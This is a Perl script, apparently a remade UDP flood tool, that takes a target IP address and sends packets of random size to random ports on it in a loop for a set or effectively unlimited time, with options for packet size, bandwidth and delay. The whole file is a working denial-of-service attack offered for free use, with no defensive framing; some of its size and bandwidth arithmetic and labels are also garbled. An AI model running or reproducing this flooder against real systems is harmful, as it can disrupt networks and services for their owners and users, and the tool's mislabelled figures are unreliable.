#!/usr/bin/perl
# Tools By Another People
# Remake & Update By NumeX

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,		# UDP port to use, numeric, 0=random
	"size=i" => \$size,		# packet size, number, 0=random
	"bandwidth=i" => \$bw,		# bandwidth to consume
	"time=i" => \$time,		# time to run
	"delay=f"=> \$delay,		# inter-packet delay
	"help|?" => \$help);		# help
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
 The usage of command is perl Remake.pl (IP)
EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: The package size overrides the parameter --the command will be ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 936 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
$endtime = time() + ($time ? $time : 99999999999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "
███████████████████████████████████████
█▄─▄▄▀█▄─▄▄─█▄─▀█▀─▄██▀▄─██▄─█─▄█▄─▄▄─█
██─▄─▄██─▄█▀██─█▄█─███─▀─███─▄▀███─▄█▀█
▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀ \n";
printf "Remake Flooder To Target";
printf "Sended Packet To All Port (0)";
printf "Dont Sell This Tools, i'ts For Free";
($size ? "$size-gigaabyte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw gbps\n" if $bw;

die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 9024);
$size -= 2036 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(9024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}
